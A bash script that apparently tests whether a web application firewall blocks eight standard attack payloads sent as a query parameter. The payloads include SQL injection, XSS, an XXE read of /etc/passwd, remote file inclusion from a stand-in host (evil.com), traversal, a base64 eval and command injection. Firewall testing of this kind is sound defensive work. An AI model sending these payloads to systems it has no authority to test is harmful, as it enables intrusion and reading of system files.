#!/bin/bash
# WAF Smoke Test - Simplified Demo Version
# This is a demonstration version for integration with the Rust WAF detector

# Basic configuration
URL="$1"
OUTPUT_FILE=""
HEADERS=()

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Parse arguments
while [ $# -gt 0 ]; do
  case "$1" in
    -o)
      OUTPUT_FILE="$2"
      shift 2
      ;;
    -H)
      HEADERS+=("-H" "$2")
      shift 2
      ;;
    *)
      if [ -z "$URL" ]; then
        URL="$1"
      fi
      shift
      ;;
  esac
done

# Check if URL is provided
if [ -z "$URL" ]; then
  echo "Error: URL is required"
  echo "Usage: $0 <URL> [-o output.json] [-H 'Header: Value']"
  exit 1
fi

# Add https:// if not present
if [[ ! "$URL" =~ ^https?:// ]]; then
  URL="https://$URL"
fi

# Add query parameter for fuzzing if not present
if [[ ! "$URL" =~ \? ]]; then
  URL="${URL}?q=FUZZ"
else
  URL="${URL}&q=FUZZ"
fi

echo "🔍 Starting WAF Effectiveness Test for: $URL"
echo "= =================================================="

# Function to test a payload
test_payload() {
  local category="$1"
  local payload="$2"
  local encoded_payload=$(echo "$payload" | jq -sRr @uri)
  local test_url="${URL/FUZZ/$encoded_payload}"
  
  # Make the request
  local response=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "${HEADERS[@]}" "$test_url" 2>/dev/null)
  
  # Determine result
  local result=""
  if [ "$response" -eq 403 ] || [ "$response" -eq 406 ] || [ "$response" -eq 429 ]; then
    result="${GREEN}BLOCKED${NC}"
  elif [ "$response" -eq 0 ]; then
    result="${YELLOW}ERROR${NC}"
    response="000"
  else
    result="${RED}ALLOWED${NC}"
  fi
  
  echo "Testing $category... $result ($response)"
  
  # Return result code for counting
  if [[ "$result" == *"BLOCKED"* ]]; then
    return 1
  elif [[ "$result" == *"ERROR"* ]]; then
    return 2
  else
    return 0
  fi
}

# Test different attack vectors
blocked=0
allowed=0
errors=0
total=0

# SQL Injection
test_payload "SQL Injection" "' OR '1'='1"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# XSS
test_payload "XSS" "<script>alert('XSS')</script>"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# XXE
test_payload "XXE" "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# RFI
test_payload "RFI" "http://evil.com/shell.php"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# LFI
test_payload "LFI" "../../../etc/passwd"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# RCE
test_payload "RCE" "eval(base64_decode('cGhwaW5mbygpOw=='))"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# Command Injection
test_payload "Command Injection" "& cat /etc/passwd"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# Path Traversal
test_payload "Path Traversal" "../../../../../../etc/passwd"
result=$?
((total++))
[ $result -eq 1 ] && ((blocked++))
[ $result -eq 0 ] && ((allowed++))
[ $result -eq 2 ] && ((errors++))

# Calculate effectiveness
effectiveness=0
if [ $total -gt 0 ]; then
  effectiveness=$(( (blocked * 100) / total ))
fi

# Print summary
echo
echo "📊 Test Results Summary:"
echo "= =============================="
echo "Total Tests: $total"
echo "Blocked: $blocked"
echo "Allowed: $allowed"
echo "Errors: $errors"
echo "Effectiveness: $effectiveness%"
echo

# WAF Detection based on results
if [ $blocked -gt 0 ]; then
  echo "WAF Detected: Yes (based on blocked requests)"
else
  echo "WAF Detected: No (no requests were blocked)"
fi

echo
echo "✅ WAF Effectiveness Test Complete!"

# Output JSON if requested
if [ -n "$OUTPUT_FILE" ]; then
  cat > "$OUTPUT_FILE" << EOF
{
  "waf_detected": $([ $blocked -gt 0 ] && echo "true" || echo "false"),
  "effectiveness_score": $effectiveness,
  "total_tests": $total,
  "blocked_tests": $blocked,
  "allowed_tests": $allowed,
  "error_tests": $errors
}
EOF
  echo "Results saved to $OUTPUT_FILE"
fi

exit 0
